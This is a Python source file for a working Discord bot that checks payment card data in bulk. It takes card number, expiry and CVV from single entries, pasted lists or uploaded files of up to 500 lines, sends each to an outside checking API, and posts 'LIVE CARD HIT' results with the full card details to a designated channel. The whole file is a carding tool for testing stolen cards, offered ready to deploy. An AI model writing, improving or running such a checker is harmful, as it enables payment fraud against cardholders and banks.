import os
import discord
from discord import app_commands
from discord.ui import Modal, TextInput
import aiohttp
import asyncio
from flask import Flask
from threading import Thread

# ==========================================
# RENDER FREE TIER HACK: KEEP ALIVE
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive and running!"

def run_webserver():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    server_thread = Thread(target=run_webserver)
    server_thread.daemon = True
    server_thread.start()

# ==========================================
# BOT SETUP & ZERO-STORAGE CONFIG
# ==========================================
intents = discord.Intents.default()
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

channel_config = {"main": None, "logs": None}
check_queue = asyncio.Queue(maxsize=2000)
session = None

# ==========================================
# HELPER FUNCTIONS & SMART API
# ==========================================
def format_card_number(cc):
    cc = ''.join(filter(str.isdigit, cc))
    return ' '.join(cc[i:i+4] for i in range(0, len(cc), 4))

async def check_card_api(card_data: str):
    global session
    max_retries = 3
    for attempt in range(max_retries):
        try:
            payload = {"data": card_data}
            async with session.post("https://api.chkr.cc/", json=payload, timeout=15) as response:
                
                # --- SMART RATE LIMIT HANDLER ---
                if response.status == 429:
                    wait_time = 5 * (attempt + 1) # Waits 5s, then 10s, then 15s
                    print(f"⚠️ API Rate Limit (429). Waiting {wait_time}s before retry...")
                    await asyncio.sleep(wait_time)
                    continue
                
                # If API returns a different error (like 500 or 403)
                if response.status != 200:
                    text = await response.text()
                    return {"error": f"API Status {response.status}: {text[:50]}"}

                return await response.json()
                
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(3)
            else:
                return {"error": f"Connection Error: {str(e)[:40]}"}
                
    return {"error": "API Rate Limit Exceeded. Try again in a few minutes."}

def create_premium_embed(card_data: str, result: dict):
    parts = card_data.split('|')
    cc = parts[0] if len(parts) > 0 else "N/A"
    mm = parts[1] if len(parts) > 1 else "N/A"
    yy = parts[2] if len(parts) > 2 else "N/A"
    cvv = parts[3] if len(parts) > 3 else "N/A"

    if "error" in result:
        return discord.Embed(title="❌ API Error", description=f"`{result['error']}`", color=0x2F3136), False

    status = result.get("status", "Unknown")
    message = result.get("message", "No message")
    card_info = result.get("card", {})
    
    bank = card_info.get("bank", "Unknown")
    card_type = card_info.get("type", "Unknown").capitalize()
    category = card_info.get("category", "Unknown").capitalize()
    country_info = card_info.get("country", {})
    country_name = country_info.get("name", "Unknown")
    country_emoji = country_info.get("emoji", "🌍")

    is_live = status.lower() in ["live", "approved"]
    color = 0x00FF00 if is_live else 0xFF0000
    status_emoji = "✅" if is_live else "❌"
    title = "💎 LIVE CARD HIT" if is_live else "🗑️ DEAD / UNKNOWN"

    embed = discord.Embed(title=title, color=color)
    embed.description = f"### {status_emoji} Status: **{status}**\n> {message}"

    embed.add_field(name="💳 Card Number", value=f"```{format_card_number(cc)}```", inline=False)
    embed.add_field(name="📅 Expiry", value=f"```{mm}/{yy}```", inline=True)
    embed.add_field(name="🔒 CVV", value=f"```{cvv}```", inline=True)
    
    embed.add_field(name="\u200b", value="\u200b", inline=False)
    embed.add_field(name="🏦 Bank", value=f"`{bank}`", inline=True)
    embed.add_field(name="🌍 Country", value=f"{country_emoji} `{country_name}`", inline=True)
    embed.add_field(name="📂 Type", value=f"`{card_type} ({category})`", inline=True)

    embed.set_footer(text="Ultra-Lightweight Checker")
    return embed, is_live

# ==========================================
# BACKGROUND WORKER
# ==========================================
async def queue_worker():
    await bot.wait_until_ready()
    while not bot.is_closed():
        try:
            item = await check_queue.get()
            result = await check_card_api(item['card'])
            embed, is_live = create_premium_embed(item['card'], result)
            
            target_channel = item['default_channel']
            if is_live and channel_config["main"]:
                ch = bot.get_channel(channel_config["main"])
                if ch: target_channel = ch
            elif not is_live and channel_config["logs"]:
                ch = bot.get_channel(channel_config["logs"])
                if ch: target_channel = ch

            try:
                await target_channel.send(embed=embed)
            except discord.HTTPException as e:
                if e.status == 429:
                    wait_time = getattr(e, 'retry_after', 5.0)
                    print(f"⚠️ Discord Rate Limit hit. Pausing for {wait_time} seconds...")
                    await asyncio.sleep(wait_time)
                    await target_channel.send(embed=embed)

            await asyncio.sleep(1.5) 
            
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"Worker error: {e}")
            await asyncio.sleep(2)

# ==========================================
# SLASH COMMANDS
# ==========================================
class CardCheckModal(Modal, title="💎 Premium Single Check"):
    card_data = TextInput(label="Card Data (CC|MM|YYYY|CVV)", placeholder="4242424242424242|12|2025|123", required=True, max_length=50)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        result = await check_card_api(self.card_data.value.strip())
        embed, _ = create_premium_embed(self.card_data.value.strip(), result)
        await interaction.followup.send(embed=embed)

@tree.command(name="check", description="Opens the GUI to check a single card")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_modal(CardCheckModal())

@tree.command(name="checkfile", description="Upload a .txt file to check continuously")
@app_commands.describe(file="The .txt file containing the cards")
async def check_file(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer()
    if not file.filename.endswith('.txt'):
        return await interaction.followup.send("❌ Please upload a `.txt` file.", ephemeral=True)

    file_content = await file.read()
    lines = [line.strip() for line in file_content.decode('utf-8').splitlines() if line.strip()]
    
    if not lines: return await interaction.followup.send("❌ File is empty.")
    
    capped = len(lines) > 500
    if capped: lines = lines[:500]

    for line in lines:
        try: check_queue.put_nowait({'card': line, 'default_channel': interaction.channel})
        except asyncio.QueueFull: break

    msg = f"✅ Added **{len(lines)}** cards to the queue."
    if capped: msg += " (Capped at 500 to protect server RAM)."
    await interaction.followup.send(msg)

@tree.command(name="checklist", description="Paste a list of cards to check continuously")
@app_commands.describe(cards="Paste multiple cards separated by new lines")
async def check_list(interaction: discord.Interaction, cards: str):
    await interaction.response.defer()
    lines = [line.strip() for line in cards.splitlines() if line.strip()]
    if not lines: return await interaction.followup.send("❌ No valid cards found.")
    
    capped = len(lines) > 500
    if capped: lines = lines[:500]

    for line in lines:
        try: check_queue.put_nowait({'card': line, 'default_channel': interaction.channel})
        except asyncio.QueueFull: break

    msg = f"✅ Added **{len(lines)}** cards to the queue."
    if capped: msg += " (Capped at 500 to protect server RAM)."
    await interaction.followup.send(msg)

@tree.command(name="setmain", description="Set the channel where LIVE cards will be dropped")
@app_commands.describe(channel="The channel for LIVE/HIT cards")
async def set_main(interaction: discord.Interaction, channel: discord.TextChannel):
    channel_config["main"] = channel.id 
    await interaction.response.send_message(f"✅ **Main Channel** set to {channel.mention}.", ephemeral=True)

@tree.command(name="setlogs", description="Set the channel where DEAD/UNKNOWN cards will be dropped")
@app_commands.describe(channel="The channel for DEAD/UNKNOWN cards")
async def set_logs(interaction: discord.Interaction, channel: discord.TextChannel):
    channel_config["logs"] = channel.id 
    await interaction.response.send_message(f"✅ **Logs Channel** set to {channel.mention}.", ephemeral=True)

# ==========================================
# BOT EVENTS
# ==========================================
@bot.event
async def on_ready():
    global session
    if session is None or session.closed:
        session = aiohttp.ClientSession()
        
    print(f"✅ Logged in as {bot.user} | RAM Optimized Mode Active")
    bot.loop.create_task(queue_worker())

    try:
        await tree.sync()
        print(f"🔄 Synced commands")
    except Exception as e:
        print(f"❌ Sync failed: {e}")

@bot.event
async def on_close():
    if session and not session.closed:
        await session.close()

# ==========================================
# RUN BOT
# ==========================================
if __name__ == "__main__":
    keep_alive() 
    
    TOKEN = os.getenv("DISCORD_BOT_TOKEN")
    if not TOKEN:
        print("❌ ERROR: DISCORD_BOT_TOKEN not set!")
    else:
        bot.run(TOKEN)
